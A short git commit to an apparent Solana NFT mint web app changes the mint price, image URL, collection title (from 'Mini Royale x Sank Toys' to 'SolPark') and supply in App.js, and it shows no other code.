1c8333b39f3658e7dfdc338ca530e49021108578
SDEEY <75689630+SDEEY@users.noreply.github.com>
2022-07-07 22:09:31 +0500

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,10 +4,10 @@ import * as solanaWeb3 from "@solana/web3.js";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const solAmount = 1.5
-const image = 'https://howrare.is/drop_logos/5501_TMrel1sv_400x400.jpg' 
-const Title = 'Mini Royale x Sank Toys'
-const supply = 3891
+const solAmount = 1
+const image = 'https://media.discordapp.net/attachments/955757641047609344/991304889655369820/Sp_59.png?width=610&height=610' 
+const Title = 'SolPark'
+const supply = 4444
 
 document.title = Title
 
